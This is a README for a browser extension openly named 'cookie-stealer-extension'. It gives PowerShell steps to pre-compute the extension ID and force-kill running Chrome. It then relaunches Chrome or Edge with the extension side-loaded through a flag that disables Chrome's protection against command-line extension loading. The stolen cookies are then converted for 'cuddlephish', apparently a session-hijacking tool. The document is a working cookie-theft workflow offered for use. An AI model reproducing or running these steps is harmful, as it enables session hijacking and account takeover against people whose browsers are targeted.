# cookie-stealer-extension

## Manual Cookie Extraction
Update manifest with public key (optional)
1. Go to `chrome://extensions/` or `edge://extensions/`
2. Enable "Developer Mode" 
3. Load the folder with the extension. 
4. View cookies in downloads

## Automated Cookie Extraction

0. Optional: Create Public Key and insert into manifest.json

Helps keep track of the extension ID thats going to be loaded  
```powershell
cd cookie-stealer-extension

#create a public key for the extension
openssl genrsa -out extension.key 2048
openssl rsa -in extension.key -pubout -outform DER -out extension_public.der
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\extension_public.der")) > extension_pubkey_b64.txt

# add base64 key to manifest.json
(Get-Content manifest.json.template -Raw) -replace 'UPDATEME', (Get-Content extension_pubkey_b64.txt -Raw) | Set-Content manifest.json
```

Calculate extension ID
```powershell
# Base64-encoded public key
$base64 = Get-Content "extension_pubkey_b64.txt" -Raw

# Decode the Base64 into bytes (DER-encoded public key)
$pubkeyBytes = [Convert]::FromBase64String($base64)

# Compute SHA256 hash
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$hash = $sha256.ComputeHash($pubkeyBytes)

# Use the first 16 bytes (128 bits) and convert each 4-bit nibble to a letter a-p (extension ID uses base16 a-p encoding)
$extensionId = ""
foreach ($b in $hash[0..15]) {
    $hi = ($b -band 0xF0) -shr 4
    $lo = $b -band 0x0F
    $extensionId += [char](97 + $hi) + [char](97 + $lo)
}

"Extension ID: $extensionId"
```

1. Update manifest.json as needed and load custom extension
```powershell
# all insteances of chrome must be stopped for this to work
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force

start-process chrome.exe -ArgumentList '--load-extension=C:\Path\To\cookie-stealer-extension --disable-features=DisableLoadExtensionCommandLineSwitch https://google.com'
# Note Edge does not require the disabled feature switch
start-process msedge.exe -ArgumentList '--load-extension=C:\Path\To\cookie-stealer-extension https://google.com'

```

2. Convert to cuddlephish
```
python converter.py -h
Usage: python converter.py <input_file>
```